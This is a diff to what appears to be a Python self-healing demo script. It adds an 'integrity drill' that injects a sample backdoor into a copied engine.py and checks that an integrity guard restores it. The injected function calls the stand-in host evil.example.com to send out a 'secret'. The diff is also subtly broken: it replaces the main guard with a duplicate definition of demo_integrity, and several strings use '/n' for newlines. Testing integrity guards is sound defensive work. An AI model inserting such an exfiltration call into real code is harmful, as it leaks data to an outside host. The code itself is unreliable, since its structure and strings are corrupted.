@@ -104,8 +104,89 @@ def main():
     print(f"  detected={len(before)} faults -> self-healed -> pytest "
           f"{'ALL GREEN' if r.returncode == 0 else 'NOT GREEN'}")
     print("=" * 72)
+
+    # H7 bonus: malicious logic injection -> integrity guard restores baseline
+    demo_integrity()
+
     return 0 if ok else 1
 
 
-if __name__ == "__main__":
+def demo_integrity():
     sys.exit(main())
+
+def demo_integrity():
+    """H7 demonstration: inject a syntactically-valid backdoor into a copy,
+    let the integrity guard detect the byte deviation and restore the trusted
+    baseline bytes (via git HEAD), then prove pytest is green again.
+    """
+    print("\n" + "=" * 72)
+    print("H7 INTEGRITY DRILL — logic injection is detected & restored")
+    print("=" * 72)
+
+    work = os.path.join(HERE, "work", "integrity_drill")
+    if os.path.exists(work):
+        shutil.rmtree(work)
+    dst = os.path.join(work, "self_heal_kit")
+    shutil.copytree(
+        HERE, dst,
+        ignore=shutil.ignore_patterns(
+            "work", ".git", ".venv", "__pycache__", ".pytest_cache",
+            "fixtures", "analysis", "README.md", "self_heal_demo.py",
+            "run_integration_demo.py", "make_fixtures.py", "self_test.py",
+        ))
+
+    # Make the copy a git repo with a committed baseline.
+    subprocess.run(["git", "init", "-q"], cwd=dst, check=True)
+    subprocess.run(["git", "add", "-A"], cwd=dst, check=True)
+    subprocess.run(["git", "-c", "user.email=demo@local", "-c", "user.name=demo",
+                    "commit", "-qm", "baseline"], cwd=dst, check=True)
+
+    print(f"\n[1] STAGE a git-baselined copy at:/n    {dst}")
+    print("    baseline commit:", subprocess.run(
+        ["git", "rev-parse", "--short", "HEAD"], cwd=dst,
+        capture_output=True, text=True, check=True).stdout.strip())
+
+    # Inject a syntactically valid backdoor (logic-level, not format-level).
+    backdoor = (
+        "\n# BACKDOOR: logic-level malicious injection (syntactically valid)\n"
+        "def _steal():\n"
+        '    try:/n        import urllib.request\n'
+        '        urllib.request.urlopen("http://evil.example.com/" + "secret", timeout=1)\n'
+        "    except Exception:/n        pass\n"
+        "_steal()\n"
+    )
+    with open(os.path.join(dst, "engine.py"), "a", encoding="utf-8") as fh:
+        fh.write(backdoor)
+    print("\n[2] INJECTED a syntactically-valid backdoor into engine.py")
+    print("    (no format rule violated -> H1..H6 cannot see it)")
+
+    # Detect: integrity guard must see the byte deviation.
+    sys.path.insert(0, dst)
+    from engine import SelfHealEngine
+    before = SelfHealEngine().detect_all(dst)
+    print("\n[3] BEFORE: engine.detect_all on the injected copy")
+    for f in before:
+        print(f"    DETECTED [{f.healer}] {os.path.relpath(f.path, dst)}: {f.description}")
+    print(f"    fault count = {len(before)}")
+
+    # Heal: run self-heal (verify = own pytest).
+    test_cmd = [sys.executable, "-m", "pytest", "-q", "tests/"]
+    res = SelfHealEngine(test_command=test_cmd).run(dst)
+    print(f"\n[4] HEAL: RESULT = {res['status']} (rounds={res['rounds']})")
+
+    # Prove the backdoor is gone and pytest is green.
+    with open(os.path.join(dst, "engine.py"), "r", encoding="utf-8") as fh:
+        content = fh.read()
+    backdoor_gone = "BACKDOOR" not in content and "_steal" not in content
+    print(f"    backdoor removed = {backdoor_gone}")
+
+    r = _run([sys.executable, "-m", "pytest", "-q", "tests/"], cwd=dst)
+    print(f"    pytest exit = {r.returncode}")
+    tail = (r.stdout + r.stderr).strip().splitlines()
+    print("    ", tail[-1] if tail else "")
+
+    print("\n" + "=" * 72)
+    ok = res["status"] == "HEALED" and r.returncode == 0 and backdoor_gone
+    print(f"H7 INTEGRITY DRILL : {'PASS' if ok else 'FAIL'}")
+    print("=" * 72)
+    return 0 if ok else 1
